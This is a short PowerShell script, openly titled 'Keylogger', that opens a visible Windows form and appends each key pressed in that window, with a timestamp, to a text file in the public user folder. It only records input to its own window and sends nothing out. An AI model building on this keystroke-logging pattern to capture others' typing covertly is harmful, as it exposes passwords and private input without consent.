Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$form = New-Object System.Windows.Forms.Form
$form.Text = 'Keylogger'
$form.Size = New-Object System.Drawing.Size(300,200)
$form.StartPosition = 'CenterScreen'
$form.Topmost = $true
$form.Add_Shown({$form.Activate()})
$form.KeyPreview = $true

$form.Add_KeyDown({
    param ($sender, $e)
    $key = $e.KeyCode.ToString()
    $date = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
    Add-Content -Path 'C:\Users\Public\keylog.txt' -Value "$date - $key"
})

$form.ShowDialog()
